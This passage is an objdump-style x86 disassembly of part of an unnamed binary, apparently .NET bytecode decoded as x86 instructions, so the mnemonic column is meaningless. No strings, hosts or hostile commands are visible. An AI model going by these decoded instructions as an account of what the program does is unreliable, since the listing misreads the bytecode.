  406266:	00 00                	add    %al,(%eax)
  406268:	06                   	push   %es
  406269:	16                   	push   %ss
  40626a:	31 09                	xor    %ecx,(%ecx)
  40626c:	07                   	pop    %es
  40626d:	6f                   	outsl  %ds:(%esi),(%dx)
  40626e:	8a 00                	mov    (%eax),%al
  406270:	00 0a                	add    %cl,(%edx)
  406272:	0a de                	or     %dh,%bl
  406274:	16                   	push   %ss
  406275:	de 0c 28             	fimuls (%eax,%ebp,1)
  406278:	25 00 00 0a 28       	and    $0x280a0000,%eax
  40627d:	27                   	daa
  40627e:	00 00                	add    %al,(%eax)
  406280:	0a de                	or     %dh,%bl
  406282:	00 72 1d             	add    %dh,0x1d(%edx)
  406285:	03 00                	add    (%eax),%eax
  406287:	70 0a                	jo     0x406293
  406289:	2b 00                	sub    (%eax),%eax
  40628b:	06                   	push   %es
  40628c:	2a 00                	sub    (%eax),%al
  40628e:	00 00                	add    %al,(%eax)
  406290:	01 10                	add    %edx,(%eax)
  406292:	00 00                	add    %al,(%eax)
  406294:	00 00                	add    %al,(%eax)
  406296:	00 00                	add    %al,(%eax)
  406298:	2b 2b                	sub    (%ebx),%ebp
  40629a:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  40629d:	00 00                	add    %al,(%eax)
  40629f:	01 13                	add    %edx,(%ebx)
  4062a1:	30 02                	xor    %al,(%edx)
  4062a3:	00 10                	add    %dl,(%eax)
  4062a5:	00 00                	add    %al,(%eax)
  4062a7:	00 40 00             	add    %al,0x0(%eax)
  4062aa:	00 11                	add    %dl,(%ecx)
  4062ac:	28 f4                	sub    %dh,%ah
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	0a 02                	or     (%edx),%al
  4062b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4062b3:	f5                   	cmc
  4062b4:	00 00                	add    %al,(%eax)
  4062b6:	0a 0a                	or     (%edx),%cl
  4062b8:	2b 00                	sub    (%eax),%eax
  4062ba:	06                   	push   %es
  4062bb:	2a 13                	sub    (%ebx),%dl
  4062bd:	30 02                	xor    %al,(%edx)
  4062bf:	00 10                	add    %dl,(%eax)
  4062c1:	00 00                	add    %al,(%eax)
  4062c3:	00 41 00             	add    %al,0x0(%ecx)
  4062c6:	00 11                	add    %dl,(%ecx)
  4062c8:	28 f4                	sub    %dh,%ah
  4062ca:	00 00                	add    %al,(%eax)
  4062cc:	0a 02                	or     (%edx),%al
  4062ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4062cf:	3c 01                	cmp    $0x1,%al
  4062d1:	00 0a                	add    %cl,(%edx)
  4062d3:	0a 2b                	or     (%ebx),%ch
  4062d5:	00 06                	add    %al,(%esi)
  4062d7:	2a 1b                	sub    (%ebx),%bl
  4062d9:	30 03                	xor    %al,(%ebx)
  4062db:	00 73 00             	add    %dh,0x0(%ebx)
  4062de:	00 00                	add    %al,(%eax)
  4062e0:	42                   	inc    %edx
  4062e1:	00 00                	add    %al,(%eax)
  4062e3:	11 1b                	adc    %ebx,(%ebx)
  4062e5:	8d 03                	lea    (%ebx),%eax
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	01 0b                	add    %ecx,(%ebx)
  4062eb:	07                   	pop    %es
  4062ec:	16                   	push   %ss
  4062ed:	28 3d 01 00 0a 8c    	sub    %bh,0x8c0a0001
  4062f3:	7d 00                	jge    0x4062f5
  4062f5:	00 01                	add    %al,(%ecx)
  4062f7:	a2 07 17 28 75       	mov    %al,0x75281707
  4062fc:	00 00                	add    %al,(%eax)
  4062fe:	0a a2 07 18 28 81    	or     -0x7ed7e7f9(%edx),%ah
  406304:	00 00                	add    %al,(%eax)
  406306:	0a a2 07 19 28 77    	or     0x77281907(%edx),%ah
  40630c:	00 00                	add    %al,(%eax)
  40630e:	0a a2 07 1a 28 3e    	or     0x3e281a07(%edx),%ah
  406314:	01 00                	add    %eax,(%eax)
  406316:	0a 28                	or     (%eax),%ch
  406318:	3f                   	aas
  406319:	01 00                	add    %eax,(%eax)
  40631b:	0a 73 40             	or     0x40(%ebx),%dh
  40631e:	01 00                	add    %eax,(%eax)
  406320:	0a 6f 41             	or     0x41(%edi),%ch
  406323:	01 00                	add    %eax,(%eax)
  406325:	0a 8c a2 00 00 01 a2 	or     -0x5dff0000(%edx,%eiz,4),%cl
  40632c:	07                   	pop    %es
  40632d:	28 7b 00             	sub    %bh,0x0(%ebx)
  406330:	00 0a                	add    %cl,(%edx)
  406332:	28 73 00             	sub    %dh,0x0(%ebx)
  406335:	00 06                	add    %al,(%esi)
  406337:	0a de                	or     %dh,%bl
  406339:	1b de                	sbb    %esi,%ebx
  40633b:	19 28                	sbb    %ebp,(%eax)
  40633d:	25 00 00 0a 72       	and    $0x720a0000,%eax
  406342:	61                   	popa
  406343:	15 00 70 0a 28       	adc    $0x280a7000,%eax
  406348:	27                   	daa
  406349:	00 00                	add    %al,(%eax)
  40634b:	0a de                	or     %dh,%bl
  40634d:	07                   	pop    %es
  40634e:	28 27                	sub    %ah,(%edi)
  406350:	00 00                	add    %al,(%eax)
  406352:	0a de                	or     %dh,%bl
  406354:	00 06                	add    %al,(%esi)
  406356:	2a 00                	sub    (%eax),%al
  406358:	01 10                	add    %edx,(%eax)
  40635a:	00 00                	add    %al,(%eax)
  40635c:	00 00                	add    %al,(%eax)
  40635e:	00 00                	add    %al,(%eax)
  406360:	58                   	pop    %eax
  406361:	58                   	pop    %eax
  406362:	00 19                	add    %bl,(%ecx)
  406364:	29 00                	sub    %eax,(%eax)
  406366:	00 01                	add    %al,(%ecx)
  406368:	13 30                	adc    (%eax),%esi
  40636a:	03 00                	add    (%eax),%eax
  40636c:	68 00 00 00 43       	push   $0x43000000
  406371:	00 00                	add    %al,(%eax)
  406373:	11 73 2c             	adc    %esi,0x2c(%ebx)
  406376:	01 00                	add    %eax,(%eax)
  406378:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  40637b:	42                   	inc    %edx
  40637c:	01 00                	add    %eax,(%eax)
  40637e:	0a 02                	or     (%edx),%al
  406380:	6f                   	outsl  %ds:(%esi),(%dx)
  406381:	f5                   	cmc
  406382:	00 00                	add    %al,(%eax)
  406384:	0a 0a                	or     (%edx),%cl
  406386:	08 06                	or     %al,(%esi)
  406388:	6f                   	outsl  %ds:(%esi),(%dx)
  406389:	2d 01 00 0a 0a       	sub    $0xa0a0001,%eax
  40638e:	73 83                	jae    0x406313
  406390:	00 00                	add    %al,(%eax)
  406392:	0a 0d 06 13 06 16    	or     0x16061306,%cl
  406398:	13 05 2b 20 11 06    	adc    0x611202b,%eax
  40639e:	11 05 91 13 04 09    	adc    %eax,0x9041391
  4063a4:	12 04 72             	adc    (%edx,%esi,2),%al
  4063a7:	73 15                	jae    0x4063be
  4063a9:	00 70 28             	add    %dh,0x28(%eax)
  4063ac:	43                   	inc    %ebx
  4063ad:	01 00                	add    %eax,(%eax)
  4063af:	0a 6f 88             	or     -0x78(%edi),%ch
  4063b2:	00 00                	add    %al,(%eax)
  4063b4:	0a 26                	or     (%esi),%ah
  4063b6:	11 05 17 d6 13 05    	adc    %eax,0x513d617
  4063bc:	11 05 11 06 8e b7    	adc    %eax,0xb78e0611
  4063c2:	32 d8                	xor    %al,%bl
  4063c4:	09 6f 8a             	or     %ebp,-0x76(%edi)
  4063c7:	00 00                	add    %al,(%eax)
  4063c9:	0a 16                	or     (%esi),%dl
  4063cb:	1f                   	pop    %ds
  4063cc:	14 6f                	adc    $0x6f,%al
  4063ce:	8d 00                	lea    (%eax),%eax
  4063d0:	00 0a                	add    %cl,(%edx)
  4063d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4063d3:	44                   	inc    %esp
  4063d4:	01 00                	add    %eax,(%eax)
  4063d6:	0a 0b                	or     (%ebx),%cl
  4063d8:	2b 00                	sub    (%eax),%eax
  4063da:	07                   	pop    %es
  4063db:	2a 1b                	sub    (%ebx),%bl
  4063dd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4063e0:	40                   	inc    %eax
  4063e1:	00 00                	add    %al,(%eax)
  4063e3:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4063e7:	11 7e f9             	adc    %edi,-0x7(%esi)
  4063ea:	00 00                	add    %al,(%eax)
  4063ec:	0a 7e 2c             	or     0x2c(%esi),%bh
  4063ef:	00 00                	add    %al,(%eax)
  4063f1:	04 18                	add    $0x18,%al
  4063f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4063f4:	45                   	inc    %ebp
  4063f5:	01 00                	add    %eax,(%eax)
  4063f7:	0a 0b                	or     (%ebx),%cl
  4063f9:	07                   	pop    %es
  4063fa:	02 03                	add    (%ebx),%al
  4063fc:	19 6f 46             	sbb    %ebp,0x46(%edi)
  4063ff:	01 00                	add    %eax,(%eax)
  406401:	0a 17                	or     (%edi),%dl
  406403:	0a de                	or     %dh,%bl
  406405:	20 de                	and    %bl,%dh
  406407:	0a 07                	or     (%edi),%al
  406409:	2c 06                	sub    $0x6,%al
  40640b:	07                   	pop    %es
  40640c:	6f                   	outsl  %ds:(%esi),(%dx)
  40640d:	5e                   	pop    %esi
  40640e:	00 00                	add    %al,(%eax)
  406410:	0a dc                	or     %ah,%bl
  406412:	de 0e                	fimuls (%esi)
  406414:	25 28 25 00 00       	and    $0x2528,%eax
  406419:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  40641c:	27                   	daa
  40641d:	00 00                	add    %al,(%eax)
  40641f:	0a de                	or     %dh,%bl
  406421:	00 16                	add    %dl,(%esi)
  406423:	0a 2b                	or     (%ebx),%ch
  406425:	00 06                	add    %al,(%esi)
  406427:	2a 01                	sub    (%ecx),%al
  406429:	1c 00                	sbb    $0x0,%al
  40642b:	00 02                	add    %al,(%edx)
  40642d:	00 11                	add    %dl,(%ecx)
  40642f:	00 0f                	add    %cl,(%edi)
  406431:	20 00                	and    %al,(%eax)
  406433:	0a 00                	or     (%eax),%al
  406435:	00 00                	add    %al,(%eax)
  406437:	00 00                	add    %al,(%eax)
  406439:	00 00                	add    %al,(%eax)
  40643b:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  40643e:	00 0e                	add    %cl,(%esi)
  406440:	29 00                	sub    %eax,(%eax)
  406442:	00 01                	add    %al,(%ecx)
  406444:	1b 30                	sbb    (%eax),%esi
  406446:	02 00                	add    (%eax),%al
  406448:	48                   	dec    %eax
  406449:	00 00                	add    %al,(%eax)
  40644b:	00 45 00             	add    %al,0x0(%ebp)
  40644e:	00 11                	add    %dl,(%ecx)
  406450:	7e f9                	jle    0x40644b
  406452:	00 00                	add    %al,(%eax)
  406454:	0a 7e 2c             	or     0x2c(%esi),%bh
  406457:	00 00                	add    %al,(%eax)
  406459:	04 6f                	add    $0x6f,%al
  40645b:	47                   	inc    %edi
  40645c:	01 00                	add    %eax,(%eax)
  40645e:	0a 0b                	or     (%ebx),%cl
  406460:	07                   	pop    %es
  406461:	02 6f 09             	add    0x9(%edi),%ch
  406464:	01 00                	add    %eax,(%eax)
  406466:	0a 28                	or     (%eax),%ch
  406468:	11 00                	adc    %eax,(%eax)
  40646a:	00 0a                	add    %cl,(%edx)
  40646c:	0c 08                	or     $0x8,%al
  40646e:	74 09                	je     0x406479
  406470:	00 00                	add    %al,(%eax)
  406472:	1b 0a                	sbb    (%edx),%ecx
  406474:	de 20                	fisubs (%eax)
  406476:	de 0a                	fimuls (%edx)
  406478:	07                   	pop    %es
  406479:	2c 06                	sub    $0x6,%al
  40647b:	07                   	pop    %es
  40647c:	6f                   	outsl  %ds:(%esi),(%dx)
  40647d:	5e                   	pop    %esi
  40647e:	00 00                	add    %al,(%eax)
  406480:	0a dc                	or     %ah,%bl
  406482:	de 0e                	fimuls (%esi)
  406484:	25 28 25 00 00       	and    $0x2528,%eax
  406489:	0a 0d 28 27 00 00    	or     0x2728,%cl
  40648f:	0a de                	or     %dh,%bl
  406491:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  406494:	2b 00                	sub    (%eax),%eax
  406496:	06                   	push   %es
  406497:	2a 01                	sub    (%ecx),%al
  406499:	1c 00                	sbb    $0x0,%al
  40649b:	00 02                	add    %al,(%edx)
  40649d:	00 10                	add    %dl,(%eax)
  40649f:	00 18                	add    %bl,(%eax)
  4064a1:	28 00                	sub    %al,(%eax)
  4064a3:	0a 00                	or     (%eax),%al
  4064a5:	00 00                	add    %al,(%eax)
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	00 00                	add    %al,(%eax)
  4064ab:	00 34 34             	add    %dh,(%esp,%esi,1)
  4064ae:	00 0e                	add    %cl,(%esi)
  4064b0:	29 00                	sub    %eax,(%eax)
  4064b2:	00 01                	add    %al,(%ecx)
  4064b4:	1b 30                	sbb    (%eax),%esi
  4064b6:	09 00                	or     %eax,(%eax)
  4064b8:	5f                   	pop    %edi
  4064b9:	01 00                	add    %eax,(%eax)
  4064bb:	00 46 00             	add    %al,0x0(%esi)
  4064be:	00 11                	add    %dl,(%ecx)
  4064c0:	02 73 48             	add    0x48(%ebx),%dh
  4064c3:	01 00                	add    %eax,(%eax)
  4064c5:	0a 0b                	or     (%ebx),%cl
  4064c7:	1a 8d 4f 00 00 01    	sbb    0x100004f(%ebp),%cl
  4064cd:	0d 07 14 72 79       	or     $0x79721407,%eax
  4064d2:	15 00 70 19 8d       	adc    $0x8d197000,%eax
  4064d7:	03 00                	add    (%eax),%eax
  4064d9:	00 01                	add    %al,(%ecx)
  4064db:	13 06                	adc    (%esi),%eax
  4064dd:	11 06                	adc    %eax,(%esi)
  4064df:	16                   	push   %ss
  4064e0:	09 a2 11 06 17 16    	or     %esp,0x16170611(%edx)
  4064e6:	8c 7d 00             	mov    %?,0x0(%ebp)
  4064e9:	00 01                	add    %al,(%ecx)
  4064eb:	a2 11 06 18 1a       	mov    %al,0x1a180611
  4064f0:	8c 7d 00             	mov    %?,0x0(%ebp)
  4064f3:	00 01                	add    %al,(%ecx)
  4064f5:	a2 11 06 13 07       	mov    %al,0x7130611
  4064fa:	11 07                	adc    %eax,(%edi)
  4064fc:	14 14                	adc    $0x14,%al
  4064fe:	19 8d 38 00 00 01    	sbb    %ecx,0x1000038(%ebp)
  406504:	13 08                	adc    (%eax),%ecx
  406506:	11 08                	adc    %ecx,(%eax)
  406508:	16                   	push   %ss
  406509:	17                   	pop    %ss
  40650a:	9c                   	pushf
  40650b:	11 08                	adc    %ecx,(%eax)
  40650d:	17                   	pop    %ss
  40650e:	16                   	push   %ss
  40650f:	9c                   	pushf
  406510:	11 08                	adc    %ecx,(%eax)
  406512:	18 16                	sbb    %dl,(%esi)
  406514:	9c                   	pushf
  406515:	11 08                	adc    %ecx,(%eax)
  406517:	17                   	pop    %ss
  406518:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40651c:	0a 26                	or     (%esi),%ah
  40651e:	11 08                	adc    %ecx,(%eax)
  406520:	16                   	push   %ss
  406521:	90                   	nop
  406522:	2c 1e                	sub    $0x1e,%al
  406524:	11 07                	adc    %eax,(%edi)
  406526:	16                   	push   %ss
  406527:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40652e:	09 00                	or     %eax,(%eax)
  406530:	00 1b                	add    %bl,(%ebx)
  406532:	28 14 00             	sub    %dl,(%eax,%eax,1)
  406535:	00 0a                	add    %cl,(%edx)
  406537:	28 42 00             	sub    %al,0x0(%edx)
  40653a:	00 0a                	add    %cl,(%edx)
  40653c:	74 09                	je     0x406547
  40653e:	00 00                	add    %al,(%eax)
  406540:	1b 0d 09 16 28 49    	sbb    0x49281609,%ecx
  406546:	01 00                	add    %eax,(%eax)
  406548:	0a 8c 7d 00 00 01 0c 	or     0xc010000(%ebp,%edi,2),%cl
  40654f:	07                   	pop    %es
  406550:	74 61                	je     0x4065b3
  406552:	00 00                	add    %al,(%eax)
  406554:	01 16                	add    %edx,(%esi)
  406556:	73 4a                	jae    0x4065a2
  406558:	01 00                	add    %eax,(%eax)
  40655a:	0a 13                	or     (%ebx),%dl
  40655c:	04 08                	add    $0x8,%al
  40655e:	17                   	pop    %ss
  40655f:	8c 7d 00             	mov    %?,0x0(%ebp)
  406562:	00 01                	add    %al,(%ecx)
  406564:	28 4b 01             	sub    %cl,0x1(%ebx)
  406567:	00 0a                	add    %cl,(%edx)
  406569:	28 1f                	sub    %bl,(%edi)
  40656b:	01 00                	add    %eax,(%eax)
  40656d:	0a 17                	or     (%edi),%dl
  40656f:	d6                   	salc
  406570:	8d 4f 00             	lea    0x0(%edi),%ecx
  406573:	00 01                	add    %al,(%ecx)
  406575:	13 05 11 04 14 72    	adc    0x72140411,%eax
  40657b:	79 15                	jns    0x406592
  40657d:	00 70 19             	add    %dh,0x19(%eax)
  406580:	8d 03                	lea    (%ebx),%eax
  406582:	00 00                	add    %al,(%eax)
  406584:	01 13                	add    %edx,(%ebx)
  406586:	07                   	pop    %es
  406587:	11 07                	adc    %eax,(%edi)
  406589:	16                   	push   %ss
  40658a:	11 05 28 11 00 00    	adc    %eax,0x1128
  406590:	0a a2 11 07 17 16    	or     0x16170711(%edx),%ah
  406596:	8c 7d 00             	mov    %?,0x0(%ebp)
  406599:	00 01                	add    %al,(%ecx)
  40659b:	a2 11 07 18 08       	mov    %al,0x8180711
  4065a0:	28 11                	sub    %dl,(%ecx)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	0a a2 11 07 13 06    	or     0x6130711(%edx),%ah
  4065aa:	11 06                	adc    %eax,(%esi)
  4065ac:	14 14                	adc    $0x14,%al
  4065ae:	19 8d 38 00 00 01    	sbb    %ecx,0x1000038(%ebp)
  4065b4:	13 08                	adc    (%eax),%ecx
  4065b6:	11 08                	adc    %ecx,(%eax)
  4065b8:	16                   	push   %ss
  4065b9:	17                   	pop    %ss
  4065ba:	9c                   	pushf
  4065bb:	11 08                	adc    %ecx,(%eax)
  4065bd:	17                   	pop    %ss
  4065be:	16                   	push   %ss
  4065bf:	9c                   	pushf
  4065c0:	11 08                	adc    %ecx,(%eax)
  4065c2:	18 17                	sbb    %dl,(%edi)
  4065c4:	9c                   	pushf
  4065c5:	11 08                	adc    %ecx,(%eax)
  4065c7:	17                   	pop    %ss
  4065c8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4065cc:	0a 26                	or     (%esi),%ah
  4065ce:	11 08                	adc    %ecx,(%eax)
  4065d0:	16                   	push   %ss
  4065d1:	90                   	nop
  4065d2:	2c 0b                	sub    $0xb,%al
  4065d4:	11 06                	adc    %eax,(%esi)
  4065d6:	16                   	push   %ss
  4065d7:	9a 28 11 00 00 0a 13 	lcall  $0x130a,$0x1128
  4065de:	05 11 08 18 90       	add    $0x90180811,%eax
  4065e3:	2c 0a                	sub    $0xa,%al
  4065e5:	11 06                	adc    %eax,(%esi)
  4065e7:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  4065ed:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  4065f0:	05 74 09 00 00       	add    $0x974,%eax
  4065f5:	1b 0a                	sbb    (%edx),%ecx
  4065f7:	de 24 de             	fisubs (%esi,%ebx,8)
  4065fa:	11 11                	adc    %edx,(%ecx)
  4065fc:	04 2c                	add    $0x2c,%al
  4065fe:	0c 11                	or     $0x11,%al
  406600:	04 74                	add    $0x74,%al
  406602:	43                   	inc    %ebx
  406603:	00 00                	add    %al,(%eax)
  406605:	01 6f 5e             	add    %ebp,0x5e(%edi)
  406608:	00 00                	add    %al,(%eax)
  40660a:	0a dc                	or     %ah,%bl
  40660c:	de 0f                	fimuls (%edi)
  40660e:	07                   	pop    %es
  40660f:	2c 0b                	sub    $0xb,%al
  406611:	07                   	pop    %es
  406612:	74 43                	je     0x406657
  406614:	00 00                	add    %al,(%eax)
  406616:	01 6f 5e             	add    %ebp,0x5e(%edi)
  406619:	00 00                	add    %al,(%eax)
  40661b:	0a dc                	or     %ah,%bl
  40661d:	06                   	push   %es
  40661e:	2a 00                	sub    (%eax),%al
  406620:	41                   	inc    %ecx
  406621:	34 00                	xor    $0x0,%al
  406623:	00 02                	add    %al,(%edx)
  406625:	00 00                	add    %al,(%eax)
  406627:	00 9d 00 00 00 9e    	add    %bl,-0x62000000(%ebp)
  40662d:	00 00                	add    %al,(%eax)
  40662f:	00 3b                	add    %bh,(%ebx)
  406631:	01 00                	add    %eax,(%eax)
  406633:	00 11                	add    %dl,(%ecx)
  406635:	00 00                	add    %al,(%eax)
  406637:	00 00                	add    %al,(%eax)
  406639:	00 00                	add    %al,(%eax)
  40663b:	00 02                	add    %al,(%edx)
  40663d:	00 00                	add    %al,(%eax)
  40663f:	00 07                	add    %al,(%edi)
  406641:	00 00                	add    %al,(%eax)
  406643:	00 47 01             	add    %al,0x1(%edi)
  406646:	00 00                	add    %al,(%eax)
  406648:	4e                   	dec    %esi
  406649:	01 00                	add    %eax,(%eax)
  40664b:	00 0f                	add    %cl,(%edi)
  40664d:	00 00                	add    %al,(%eax)
  40664f:	00 00                	add    %al,(%eax)
  406651:	00 00                	add    %al,(%eax)
  406653:	00 1b                	add    %bl,(%ebx)
  406655:	30 09                	xor    %cl,(%ecx)
  406657:	00 50 01             	add    %dl,0x1(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	47                   	inc    %edi
  40665d:	00 00                	add    %al,(%eax)
  40665f:	11 73 6c             	adc    %esi,0x6c(%ebx)
  406662:	00 00                	add    %al,(%eax)
  406664:	0a 0b                	or     (%ebx),%cl
  406666:	02 8e b7 28 4c 01    	add    0x14c28b7(%esi),%cl
  40666c:	00 0a                	add    %cl,(%edx)
  40666e:	0c 07                	or     $0x7,%al
  406670:	14 72                	adc    $0x72,%al
  406672:	83 15 00 70 19 8d 03 	adcl   $0x3,0x8d197000
  406679:	00 00                	add    %al,(%eax)
  40667b:	01 13                	add    %edx,(%ebx)
  40667d:	04 11                	add    $0x11,%al
  40667f:	04 16                	add    $0x16,%al
  406681:	08 28                	or     %ch,(%eax)
  406683:	11 00                	adc    %eax,(%eax)
  406685:	00 0a                	add    %cl,(%edx)
  406687:	a2 11 04 17 16       	mov    %al,0x16170411
  40668c:	8c 7d 00             	mov    %?,0x0(%ebp)
  40668f:	00 01                	add    %al,(%ecx)
  406691:	a2 11 04 18 1a       	mov    %al,0x1a180411
  406696:	8c 7d 00             	mov    %?,0x0(%ebp)
  406699:	00 01                	add    %al,(%ecx)
  40669b:	a2 11 04 13 05       	mov    %al,0x5130411
  4066a0:	11 05 14 14 19 8d    	adc    %eax,0x8d191414
  4066a6:	38 00                	cmp    %al,(%eax)
  4066a8:	00 01                	add    %al,(%ecx)
  4066aa:	13 06                	adc    (%esi),%eax
  4066ac:	11 06                	adc    %eax,(%esi)
  4066ae:	16                   	push   %ss
  4066af:	17                   	pop    %ss
  4066b0:	9c                   	pushf
  4066b1:	11 06                	adc    %eax,(%esi)
  4066b3:	17                   	pop    %ss
  4066b4:	16                   	push   %ss
  4066b5:	9c                   	pushf
  4066b6:	11 06                	adc    %eax,(%esi)
  4066b8:	18 16                	sbb    %dl,(%esi)
  4066ba:	9c                   	pushf
  4066bb:	11 06                	adc    %eax,(%esi)
  4066bd:	17                   	pop    %ss
  4066be:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4066c2:	0a 26                	or     (%esi),%ah
  4066c4:	11 06                	adc    %eax,(%esi)
  4066c6:	16                   	push   %ss
  4066c7:	90                   	nop
  4066c8:	2c 0a                	sub    $0xa,%al
  4066ca:	11 05 16 9a 28 11    	adc    %eax,0x11289a16
  4066d0:	00 00                	add    %al,(%eax)
  4066d2:	0a 0c 07             	or     (%edi,%eax,1),%cl
  4066d5:	74 61                	je     0x406738
  4066d7:	00 00                	add    %al,(%eax)
  4066d9:	01 17                	add    %edx,(%edi)
  4066db:	73 4a                	jae    0x406727
  4066dd:	01 00                	add    %eax,(%eax)
  4066df:	0a 0d 09 14 72 83    	or     0x83721409,%cl
  4066e5:	15 00 70 19 8d       	adc    $0x8d197000,%eax
  4066ea:	03 00                	add    (%eax),%eax
  4066ec:	00 01                	add    %al,(%ecx)
  4066ee:	13 05 11 05 16 02    	adc    0x2160511,%eax
  4066f4:	a2 11 05 17 16       	mov    %al,0x16170511
  4066f9:	8c 7d 00             	mov    %?,0x0(%ebp)
  4066fc:	00 01                	add    %al,(%ecx)
  4066fe:	a2 11 05 18 02       	mov    %al,0x2180511
  406703:	8e b7 8c 7d 00 00    	mov    0x7d8c(%edi),%?
  406709:	01 a2 11 05 13 04    	add    %esp,0x4130511(%edx)
  40670f:	11 04 14             	adc    %eax,(%esp,%edx,1)
  406712:	14 19                	adc    $0x19,%al
  406714:	8d 38                	lea    (%eax),%edi
  406716:	00 00                	add    %al,(%eax)
  406718:	01 13                	add    %edx,(%ebx)
  40671a:	06                   	push   %es
  40671b:	11 06                	adc    %eax,(%esi)
  40671d:	16                   	push   %ss
  40671e:	17                   	pop    %ss
  40671f:	9c                   	pushf
  406720:	11 06                	adc    %eax,(%esi)
  406722:	17                   	pop    %ss
  406723:	16                   	push   %ss
  406724:	9c                   	pushf
  406725:	11 06                	adc    %eax,(%esi)
  406727:	18 16                	sbb    %dl,(%esi)
  406729:	9c                   	pushf
  40672a:	11 06                	adc    %eax,(%esi)
  40672c:	17                   	pop    %ss
  40672d:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  406731:	0a 26                	or     (%esi),%ah
  406733:	11 06                	adc    %eax,(%esi)
  406735:	16                   	push   %ss
  406736:	90                   	nop
  406737:	2c 1f                	sub    $0x1f,%al
  406739:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40673c:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  406743:	09 00                	or     %eax,(%eax)
  406745:	00 1b                	add    %bl,(%ebx)
  406747:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40674a:	00 0a                	add    %cl,(%edx)
  40674c:	28 42 00             	sub    %al,0x0(%edx)
  40674f:	00 0a                	add    %cl,(%edx)
  406751:	74 09                	je     0x40675c
  406753:	00 00                	add    %al,(%eax)
  406755:	1b 10                	sbb    (%eax),%edx
  406757:	00 09                	add    %cl,(%ecx)
  406759:	14 72                	adc    $0x72,%al
  40675b:	8f                   	(bad)
  40675c:	15 00 70 16 8d       	adc    $0x8d167000,%eax
  406761:	03 00                	add    (%eax),%eax
  406763:	00 01                	add    %al,(%ecx)
  406765:	14 14                	adc    $0x14,%al
  406767:	14 17                	adc    $0x17,%al
  406769:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40676d:	0a 26                	or     (%esi),%ah
  40676f:	de 0f                	fimuls (%edi)
  406771:	09 2c 0b             	or     %ebp,(%ebx,%ecx,1)
  406774:	09 74 43 00          	or     %esi,0x0(%ebx,%eax,2)
  406778:	00 01                	add    %al,(%ecx)
  40677a:	6f                   	outsl  %ds:(%esi),(%dx)
  40677b:	5e                   	pop    %esi
  40677c:	00 00                	add    %al,(%eax)
  40677e:	0a dc                	or     %ah,%bl
  406780:	07                   	pop    %es
  406781:	14 72                	adc    $0x72,%al
  406783:	9b                   	fwait
  406784:	15 00 70 16 8d       	adc    $0x8d167000,%eax
  406789:	03 00                	add    (%eax),%eax
  40678b:	00 01                	add    %al,(%ecx)
  40678d:	14 14                	adc    $0x14,%al
  40678f:	14 28                	adc    $0x28,%al
  406791:	41                   	inc    %ecx
  406792:	00 00                	add    %al,(%eax)
  406794:	0a 74 09 00          	or     0x0(%ecx,%ecx,1),%dh
  406798:	00 1b                	add    %bl,(%ebx)
  40679a:	0a de                	or     %dh,%bl
  40679c:	11 de                	adc    %ebx,%esi
  40679e:	0f 07                	sysret
  4067a0:	2c 0b                	sub    $0xb,%al
  4067a2:	07                   	pop    %es
  4067a3:	74 43                	je     0x4067e8
  4067a5:	00 00                	add    %al,(%eax)
  4067a7:	01 6f 5e             	add    %ebp,0x5e(%edi)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	0a dc                	or     %ah,%bl
  4067ae:	06                   	push   %es
  4067af:	2a 41 34             	sub    0x34(%ecx),%al
  4067b2:	00 00                	add    %al,(%eax)
  4067b4:	02 00                	add    (%eax),%al
  4067b6:	00 00                	add    %al,(%eax)
  4067b8:	81 00 00 00 90 00    	addl   $0x900000,(%eax)
  4067be:	00 00                	add    %al,(%eax)
  4067c0:	11 01                	adc    %eax,(%ecx)
  4067c2:	00 00                	add    %al,(%eax)
  4067c4:	0f 00 00             	sldt   (%eax)
  4067c7:	00 00                	add    %al,(%eax)
  4067c9:	00 00                	add    %al,(%eax)
  4067cb:	00 02                	add    %al,(%edx)
  4067cd:	00 00                	add    %al,(%eax)
  4067cf:	00 06                	add    %al,(%esi)
  4067d1:	00 00                	add    %al,(%eax)
  4067d3:	00 39                	add    %bh,(%ecx)
  4067d5:	01 00                	add    %eax,(%eax)
  4067d7:	00 3f                	add    %bh,(%edi)
  4067d9:	01 00                	add    %eax,(%eax)
  4067db:	00 0f                	add    %cl,(%edi)
  4067dd:	00 00                	add    %al,(%eax)
  4067df:	00 00                	add    %al,(%eax)
  4067e1:	00 00                	add    %al,(%eax)
  4067e3:	00 1b                	add    %bl,(%ebx)
  4067e5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4067e8:	55                   	push   %ebp
  4067e9:	00 00                	add    %al,(%eax)
  4067eb:	00 48 00             	add    %cl,0x0(%eax)
  4067ee:	00 11                	add    %dl,(%ecx)
  4067f0:	73 2b                	jae    0x40681d
  4067f2:	01 00                	add    %eax,(%eax)
  4067f4:	0a 0a                	or     (%edx),%cl
  4067f6:	73 2c                	jae    0x406824
  4067f8:	01 00                	add    %eax,(%eax)
  4067fa:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4067fd:	08 7e 09             	or     %bh,0x9(%esi)
  406800:	00 00                	add    %al,(%eax)
  406802:	04 28                	add    $0x28,%al
